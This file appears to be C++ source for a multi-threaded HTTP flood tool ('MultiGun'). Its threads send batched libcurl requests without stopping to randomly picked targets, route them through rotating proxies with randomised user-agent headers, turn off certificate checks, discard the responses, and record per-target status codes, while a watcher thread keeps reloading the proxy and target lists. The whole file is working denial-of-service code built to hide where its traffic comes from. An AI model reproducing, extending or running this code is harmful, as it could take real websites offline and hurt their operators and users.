#include "multigun.h"



MultiGun::MultiGun(Jobs * jobs, Proxy * prx, Stats *stat)
{

    this->jobs = jobs;
    this->prx  = prx;
    this->stat = stat;
    this->uaHeaders = new UaHeaders();


    this->watcherTh = new std::thread(&MultiGun::watcher,this);

}

void MultiGun::fire() {
    threads.clear();
    thState.clear();
    for (uint i = 0;i < threadsCount; i++) {
        auto th = new std::thread(&MultiGun::httpGet,this,i);
        threads.push_back(th);
    }
    startTime = time(nullptr);
}


void MultiGun::watcher() {
    size_t i = 1; // init load in main.cpp
    while (true) {
        if (i % 30 == 0) {
            prx->loadUrl(); // load last succesed
        }
        if (i % 5 == 0) {
            prx->cleanBad(this->stat);
            if (prx->count() == 0) { // empty proxy list, try load
                prx->loadUrl();
            }
        }

        if (i == 15) {
            jobs->load();
        }
        i++;
        if (i == 61) {
            i = 1;
        }
        std::this_thread::sleep_for(std::chrono::minutes(1));

    }
}



size_t WriteCallbackM(void *contents, size_t size, size_t nmemb, void *userp)
{
    return size * nmemb;
    //((std::string*)userp)->append((char*)contents, size * nmemb);
    //return size * nmemb;
}

void MultiGun::httpGet(uint thId) {
    auto delay = (rand() % 15);
    std::cout<<utils::log_time() << "starting thread: " << thId << " with delay " << delay << " sec" << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(delay));

    const int hNum = this->batch_requests;
    CURL  * handles[hNum];
    CURLM * multi_handle;
    int runningCount = 1;
    std::string readBuffer;

    // for stat
    std::vector<std::string> targets;
    std::vector<std::string> prxS;
    //for stat--

    multi_handle = curl_multi_init();
    for (int i=0;i<hNum;i++) {
        handles[i] = curl_easy_init();

        auto curl = handles[i];

        curl_multi_add_handle(multi_handle, curl);
    }

    while (true) {
        runningCount = 1;
        for (int i=0;i<hNum;i++) {
            if (prx->count() == 0) {
                std::cout<<utils::log_time() << "No proxies, waiting " << std::endl;
                std::this_thread::sleep_for(std::chrono::minutes(1));
                break;
            }
            string randPrx = prx->getRand();
            auto curl = handles[i];


            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackM);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            curl_easy_setopt(curl, CURLOPT_BUFFERSIZE, 1024L);
            //curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);

            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_AUTOREFERER, 1L);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, uaHeaders->getRand());


            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
            curl_easy_setopt(curl, CURLOPT_SSL_FALSESTART, 1L);
#ifdef __linux
            curl_easy_setopt(curl, CURLOPT_TCP_FASTOPEN, 1L);
#endif


            thState[thId].state = "req";
            thState[thId].count++;

            curl_easy_setopt(curl, CURLOPT_PROXY, randPrx.c_str());
            prxS.push_back(randPrx);

            Job * job;
            job = jobs->getRand();
            //thState[thId].target = job->getTarget();

            targets.push_back(job->getTarget());
            auto jobTarget = job->path.c_str();
            curl_easy_setopt(curl, CURLOPT_URL, jobTarget);
            if (job->staticHost != "") {
                auto hr = job->hostResolve;
                curl_easy_setopt(curl, CURLOPT_RESOLVE, hr);
            }
        }

        while (runningCount) {
            CURLMcode mc = curl_multi_perform(multi_handle, &runningCount);
            if (runningCount) {
                 mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);
            }
            if (mc == CURLM_OK) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            if (mc != CURLM_OK) {
                std::cout<<utils::log_time() << "CURL multi not OK: " << mc << std::endl;
                break;// something wrong
            }
            thState[thId].target = "requests running " + std::to_string(runningCount) + " of " +std::to_string(hNum);
            //std::cout << "Running " << runningCount << std::endl;
        }

        CURLMsg *msg; /* for picking up messages with the transfer status */
        int msgs_left; /* how many messages are left */
        while ((msg = curl_multi_info_read(multi_handle, &msgs_left))) {
            if (msg->msg == CURLMSG_DONE) {
                int i = 0;
                for(i = 0; i < hNum; i ++) {
                    if (msg->easy_handle == handles[i]) {
                        break;
                    }
                }
                long http_code = 0;
                // CURLINFO_PROXY_ERROR
                curl_easy_getinfo (handles[i], CURLINFO_RESPONSE_CODE, &http_code);
                auto res = msg->data.result;
                this->stat->push(targets.at(i), prxS.at(i),res,http_code);
                curl_multi_remove_handle(multi_handle,handles[i]);

            }
        }
        //clean up
        curl_multi_cleanup(multi_handle);
        multi_handle = curl_multi_init();
        for (int i=0;i<hNum;i++) {
            //curl_easy_reset(handles[i]);
            curl_easy_cleanup(handles[i]);
            handles[i] = curl_easy_init();
            curl_multi_add_handle(multi_handle,handles[i]);
        }
        prxS.clear();
        targets.clear();
        //std::cout << "Clean up, next" << std::endl;
    }

}
